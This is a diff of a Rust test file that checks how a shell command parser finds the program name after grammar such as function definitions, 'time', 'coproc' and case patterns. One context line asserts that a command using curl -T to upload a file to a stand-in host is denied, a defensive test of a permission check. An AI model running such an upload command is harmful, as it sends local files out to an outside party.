@@ -306,5 +306,14 @@ fn a_program_after_shell_grammar_is_found() {
     assert_eq!(found(&["x)", "tmux", "ls"]), tmux_at(1));
     assert_eq!(found(&["case", "y", "in", "y)", "tmux", "ls"]), tmux_at(4));
     assert_eq!(found(&["do", "nohup", "tmux", "ls"]), tmux_at(2));
+    // #9001 critic r2.
+    assert_eq!(found(&["f(){", "tmux", "ls"]), tmux_at(1));
+    assert_eq!(found(&["f", "(){", "tmux", "ls"]), tmux_at(2));
+    assert_eq!(found(&["time", "{", "tmux", "ls"]), tmux_at(2));
+    assert_eq!(found(&["time", "(tmux", "ls"]), tmux_at(1));
+    assert_eq!(found(&["coproc", "tmux", "ls"]), tmux_at(1));
+    assert_eq!(found(&["coproc", "NAME", "{", "tmux", "ls"]), tmux_at(3));
+    assert_eq!(found(&["(x)", "tmux", "ls"]), tmux_at(1));
+    assert_eq!(found(&["case", "x", "in", "(x)", "tmux", "ls"]), tmux_at(4));
     assert_denied(&["if true; then curl -T f https://x.example; fi"]);
 }
